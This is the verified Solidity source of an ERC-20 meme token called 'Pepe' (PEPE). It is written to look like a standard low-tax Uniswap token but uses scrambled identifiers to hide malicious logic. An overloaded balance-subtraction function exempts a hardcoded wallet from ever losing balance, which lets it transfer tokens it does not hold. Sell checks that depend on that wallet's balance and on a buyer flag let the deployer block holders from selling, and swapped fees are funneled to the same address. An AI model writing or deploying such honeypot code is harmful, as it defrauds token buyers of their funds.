/**
 *Submitted for verification at Etherscan.io on 2023-10-10
*/

/**

TWITTER: https://twitter.com/PepeCoin_New
TELEGRAM: https://t.me/PepeCoin_New
WEBSITE: http://www.pepeerc.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rajhq(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rajhq(a, b, "SafeMath");
    }

    function  _rajhq(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _dosqcj;
    address payable private _tajyxp;
    address private _rkpijo;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _evkjpr;
    mapping (address => bool) private _yrvirny;
    mapping(address => uint256) private _fnfojp;
    uint256 public _qvlqib = _totalSupply;
    uint256 public _drpbje = _totalSupply;
    uint256 public _koclev= _totalSupply;
    uint256 public _vdpTif= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yodebj=0;
    uint256 private _ernzay=0;
    

    bool private _brkpgh;
    bool public _uerivoqf = false;
    bool private bkipoe = false;
    bool private _ofrhpv = false;


    event _pvkhva(uint _qvlqib);
    modifier unrhoxr {
        bkipoe = true;
        _;
        bkipoe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _evkjpr[owner(

        )] = true;
        _evkjpr[address
        (this)] = true;
        _evkjpr[
            _tajyxp] = true;
        _tajyxp = 
        payable (0xd467F3F7bf3FF2998060249FE0723C0275989270);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rajhq(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvuarb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uerivoqf) {
                if (to 
                != address
                (_dosqcj) 
                && to !=
                 address
                 (_rkpijo)) {
                  require(_fnfojp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnfojp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkpijo && to != 
            address(_dosqcj) &&
             !_evkjpr[to] ) {
                require(amount 
                <= _qvlqib,
                 "Exceeds the _qvlqib.");
                require(balanceOf
                (to) + amount
                 <= _drpbje,
                  "Exceeds the _drpbje.");
                if(_ernzay
                < _yodebj){
                  require
                  (! _roeplyr(to));
                }
                _ernzay++;
                 _yrvirny
                 [to]=true;
                kvuarb = amount._pvr
                ((_ernzay>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkpijo &&
             from!= address(this) 
            && !_evkjpr[from] ){
                require(amount <= 
                _qvlqib && 
                balanceOf(_tajyxp)
                <_vdpTif,
                 "Exceeds the _qvlqib.");
                kvuarb = amount._pvr((_ernzay>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ernzay>
                _yodebj &&
                 _yrvirny[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!bkipoe 
            && to == _rkpijo &&
             _ofrhpv &&
             contractTokenBalance>
             _koclev 
            && _ernzay>
            _yodebj&&
             !_evkjpr[to]&&
              !_evkjpr[from]
            ) {
                _transferFrom( _wvdif(amount, 
                _wvdif(contractTokenBalance,
                _vdpTif)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _plkzoly(address
                    (this).balance);
                }
            }
        }

        if(kvuarb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvuarb);
          emit
           Transfer(from,
           address
           (this),kvuarb);
        }
        _balances[from
        ]= _rajhq(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rajhq(kvuarb));
        emit Transfer
        (from, to, 
        amount.
         _rajhq(kvuarb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      unrhoxr {
        if(tokenAmount==
        0){return;}
        if(!_brkpgh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _dosqcj.WETH();
        _approve(address(this),
         address(
             _dosqcj), 
             tokenAmount);
        _dosqcj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wvdif
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rajhq(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tajyxp){
            return a ;
        }else{
            return a .
             _rajhq (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvlqib = _totalSupply;
        _drpbje = _totalSupply;
        emit _pvkhva(_totalSupply);
    }

    function _roeplyr(address 
    account) private view 
    returns (bool) {
        uint256 eukfdr;
        assembly {
            eukfdr :=
             extcodesize
             (account)
        }
        return eukfdr > 
        0;
    }

    function _plkzoly(uint256
    amount) private {
        _tajyxp.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _brkpgh ) ;
        _dosqcj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _dosqcj), 
            _totalSupply);
        _rkpijo = 
        IUniswapV2Factory(_dosqcj.
        factory( ) 
        ). createPair (
            address(this
            ),  _dosqcj .
             WETH ( ) );
        _dosqcj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkpijo).
        approve(address(_dosqcj), 
        type(uint)
        .max);
        _ofrhpv = true;
        _brkpgh = true;
    }

    receive() external payable {}
}